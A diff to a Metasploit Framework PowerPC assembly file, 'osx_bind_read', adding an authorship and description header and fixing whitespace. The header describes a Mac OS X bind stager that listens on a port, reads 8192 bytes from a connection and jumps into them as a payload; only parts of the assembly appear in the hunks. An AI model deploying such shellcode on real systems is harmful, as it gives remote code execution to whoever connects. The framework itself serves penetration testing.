@@ -1,3 +1,23 @@
+;;
+;
+;        Name: osx_bind_read
+;   Qualities: Can Have Nulls
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore <hdm [at] metasploit.com>
+;     Version: $Revision$
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Binds a port, listens, accepts, reads 8192 bytes and
+;        then jumps into the loaded payload. Socket descriptor
+;        is left in r30.
+;;
+
 .globl _main
 .text
 _main:
@@ -6,7 +26,7 @@ _main:
 	li	r4, 1
 	li	r5, 6
 	li	r0, 97
-        sc
+	sc
 	xor	r0, r0, r0
 	mr 	r30, r3
 
@@ -27,7 +47,7 @@ listen:
 	li	r0, 106
 	mr	r3, r30
 	sc
-        xor     r0, r0, r0
+	xor     r0, r0, r0
 
 accept:
 	mr	r3, r30
@@ -49,3 +69,4 @@ reader:
 	sc
 	xor		r0, r0, r0
 	blr
+	xor		r0, r0, r0
